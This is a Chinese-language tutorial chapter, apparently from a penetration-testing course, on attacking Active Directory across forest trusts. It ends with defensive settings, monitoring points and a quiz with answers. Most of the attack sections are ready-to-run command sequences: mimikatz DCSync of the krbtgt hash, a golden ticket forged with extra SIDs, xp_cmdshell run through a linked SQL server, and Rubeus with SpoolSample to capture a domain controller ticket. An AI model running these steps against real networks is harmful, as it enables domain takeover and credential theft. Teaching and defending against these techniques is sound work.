# 跨森林攻击详解

## 写在前面

森林信任是 Microsoft 设计的安全边界，但在某些配置下仍然可以被突破。本章详细讲解跨森林攻击技术。

---

## 一、森林信任与 SID 过滤

### 1.1 SID 过滤机制

```
SID 过滤 (SID Filtering):
├── 森林信任默认启用
├── 过滤 ExtraSids 中的特权 SID
├── 防止跨森林的 SID History 攻击
└── RID < 1000 的 SID 始终被过滤
```

### 1.2 被过滤的 SID

```
始终被过滤的 SID (RID < 1000):
├── Domain Admins (RID 512)
├── Enterprise Admins (RID 519)
├── Schema Admins (RID 518)
├── Administrators (RID 544)
└── 其他内置组
```

### 1.3 不被过滤的 SID

```
可能不被过滤的 SID (RID >= 1000):
├── 自定义组
├── 普通用户
└── 服务账户
```

## 二、枚举森林信任

### 2.1 使用 .NET

```powershell
# 枚举森林信任
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

# 输出示例:
# SourceName: corp1.com
# TargetName: corp2.com
# TrustType: Forest
# TrustDirection: Bidirectional
```

### 2.2 使用 PowerView

```powershell
# 枚举森林信任
Get-ForestTrust

# 枚举域信任
Get-DomainTrust -Domain corp2.com

# 检查信任属性
# TrustAttributes: FOREST_TRANSITIVE = 正常森林信任
# TrustAttributes: TREAT_AS_EXTERNAL,FOREST_TRANSITIVE = SID History 已启用
```

### 2.3 枚举外部森林

```powershell
# 枚举外部森林的用户
Get-DomainUser -Domain corp2.com

# 枚举外部森林的组
Get-DomainGroup -Domain corp2.com

# 查找外部组成员
Get-DomainForeignGroupMember -Domain corp2.com
```

## 三、SID History 攻击

### 3.1 攻击前提

```
攻击条件:
├── 已完全控制源森林
├── 目标森林启用了 SID History
├── 找到 RID >= 1000 的特权组
└── 该组有足够的权限
```

### 3.2 检查 SID History 状态

```powershell
# 检查信任属性
Get-DomainTrust -Domain corp2.com

# 如果 TrustAttributes 包含 TREAT_AS_EXTERNAL
# 说明 SID History 已启用
```

### 3.3 查找可利用的组

```powershell
# 枚举 Administrators 组成员
Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com

# 输出示例:
# MemberName: powerGroup
# MemberSID: S-1-5-21-4182647938-3943167060-1815963754-1106
# RID 1106 >= 1000，可以利用！

# 枚举其他特权组
Get-DomainGroupMember -Identity "Domain Admins" -Domain corp2.com
Get-DomainGroupMember -Identity "Remote Desktop Users" -Domain corp2.com
```

### 3.4 执行攻击

```cmd
# 1. 获取源森林的 krbtgt 哈希
mimikatz # lsadump::dcsync /domain:corp1.com /user:krbtgt

# 2. 获取两个森林的 SID
Get-DomainSID -Domain corp1.com
# S-1-5-21-1095350385-1831131555-2412080359

Get-DomainSID -Domain corp2.com
# S-1-5-21-4182647938-3943167060-1815963754

# 3. 创建 Golden Ticket (使用 RID >= 1000 的组)
mimikatz # kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:HASH /sids:S-1-5-21-4182647938-3943167060-1815963754-1106 /ptt

# 4. 访问目标森林
dir \\dc01.corp2.com\c$
```

## 四、链接 SQL Server 攻击

### 4.1 跨森林 SQL 链接

```
攻击场景:
├── 源森林有 SQL Server
├── SQL Server 链接到目标森林的 SQL Server
├── 链接配置了高权限账户
└── 可以通过链接执行命令
```

### 4.2 枚举跨森林链接

```sql
-- 枚举链接服务器
EXEC sp_linkedservers;

-- 检查链接到外部森林的服务器
SELECT * FROM sys.servers WHERE is_linked = 1;
```

### 4.3 利用跨森林链接

```sql
-- 在外部森林的 SQL Server 上执行查询
SELECT * FROM OPENQUERY("EXTERNAL_SQL", 'SELECT SYSTEM_USER');

-- 检查权限
SELECT * FROM OPENQUERY("EXTERNAL_SQL", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- 如果有 sysadmin 权限，执行命令
EXEC ('xp_cmdshell ''whoami''') AT EXTERNAL_SQL;
```

## 五、打印机漏洞跨森林攻击

### 5.1 攻击原理

```
攻击流程:
├── 源森林有无约束委派的服务器
├── 目标森林的域控开放打印机服务
├── 强制目标域控认证到源森林
├── 获取目标域控的 TGT
└── 使用 TGT 执行 DCSync
```

### 5.2 检查打印机服务

```powershell
# 检查目标森林域控的打印机服务
dir \\dc01.corp2.com\pipe\spoolss
```

### 5.3 执行攻击

```cmd
# 1. 在源森林的无约束委派服务器上启动 Rubeus
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# 2. 触发打印机漏洞
SpoolSample.exe dc01.corp2.com appsrv01.corp1.com

# 3. 获取 TGT 并注入
Rubeus.exe ptt /ticket:BASE64_TICKET

# 4. 执行 DCSync
mimikatz # lsadump::dcsync /domain:corp2.com /user:administrator
```

### 5.4 注意事项

```
限制:
├── 2019 年后的补丁阻止了跨森林的 TGT 委派
├── 需要目标森林未打补丁
├── 或者使用其他方法绕过
```

## 六、外部组成员攻击

### 6.1 查找外部组成员

```powershell
# 查找源森林用户在目标森林的组成员关系
Get-DomainForeignGroupMember -Domain corp2.com

# 输出示例:
# GroupName: myGroup2
# MemberName: S-1-5-21-3776646582-2086779273-4091361643-1601
#
# 转换 SID
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-1601
# PROD\dave
```

### 6.2 利用外部组成员

```
攻击流程:
├── 发现 dave 用户是 corp2.com 中 myGroup2 的成员
├── 攻陷 dave 用户
├── 使用 dave 的凭证访问 corp2.com
└── 根据 myGroup2 的权限进行进一步攻击
```

## 七、完整攻击流程

### 7.1 跨森林攻击步骤

```
步骤 1: 枚举森林信任
┌─────────────────────────────────────────────────────────────┐
│  Get-ForestTrust                                            │
│  发现: corp1.com ↔ corp2.com (双向森林信任)                  │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 2: 检查 SID History 状态
┌─────────────────────────────────────────────────────────────┐
│  Get-DomainTrust -Domain corp2.com                          │
│  检查 TrustAttributes 是否包含 TREAT_AS_EXTERNAL            │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 3: 查找可利用的组
┌─────────────────────────────────────────────────────────────┐
│  Get-DomainGroupMember -Identity "Administrators"           │
│      -Domain corp2.com                                      │
│  找到 RID >= 1000 的特权组                                   │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 4: 创建 Golden Ticket
┌─────────────────────────────────────────────────────────────┐
│  kerberos::golden /user:h4x /domain:corp1.com               │
│      /sid:SOURCE_SID /krbtgt:HASH                           │
│      /sids:TARGET_SID-GROUP_RID /ptt                        │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 5: 访问目标森林
┌─────────────────────────────────────────────────────────────┐
│  dir \\dc01.corp2.com\c$                                    │
│  或 PsExec \\dc01.corp2.com cmd                             │
└─────────────────────────────────────────────────────────────┘
```

## 八、防御措施

### 8.1 保持 SID 过滤

```cmd
# 确保 SID History 未启用
netdom trust CORP2.COM /d:CORP1.COM /enablesidhistory:no

# 启用隔离
netdom trust CORP2.COM /d:CORP1.COM /quarantine:yes
```

### 8.2 限制跨森林访问

```
安全建议:
├── 最小化跨森林的组成员关系
├── 避免将外部用户添加到特权组
├── 定期审计跨森林权限
├── 监控跨森林认证
└── 及时应用安全补丁
```

### 8.3 监控

```
监控点:
├── 跨森林 TGT 请求
├── 包含 ExtraSids 的票据
├── 跨森林的 DCSync 活动
├── 打印机服务的异常连接
└── SQL Server 跨森林链接活动
```

## 九、练习题

### 选择题

1. SID 过滤会过滤哪些 SID？
   - A) 所有 SID
   - B) RID < 1000 的 SID
   - C) RID >= 1000 的 SID
   - D) 只有 Enterprise Admins

2. 启用 SID History 后，TrustAttributes 会包含什么？
   - A) FOREST_TRANSITIVE
   - B) TREAT_AS_EXTERNAL
   - C) SID_HISTORY_ENABLED
   - D) NO_FILTERING

3. 跨森林 SID History 攻击需要什么条件？
   - A) 目标森林启用 SID History
   - B) 找到 RID >= 1000 的特权组
   - C) 控制源森林
   - D) 以上全部

4. 打印机漏洞跨森林攻击的限制是？
   - A) 需要管理员权限
   - B) 2019 年后的补丁阻止了跨森林 TGT 委派
   - C) 只能在工作日使用
   - D) 需要物理访问

5. 如何检查森林信任的 SID History 状态？
   - A) Get-DomainTrust
   - B) Get-ForestTrust
   - C) nltest
   - D) 以上都可以

### 答案

1-B, 2-B, 3-D, 4-B, 5-A

## 十、总结

### 关键要点

✅ 森林信任默认启用 SID 过滤
✅ RID < 1000 的 SID 始终被过滤
✅ SID History 启用后可以利用 RID >= 1000 的组
✅ 跨森林 SQL 链接可能提供攻击路径
✅ 打印机漏洞在旧系统上仍然有效

### 攻击链

```
枚举森林信任
      ↓
检查 SID History 状态
      ↓
查找 RID >= 1000 的特权组
      ↓
创建带 ExtraSids 的 Golden Ticket
      ↓
访问目标森林
```
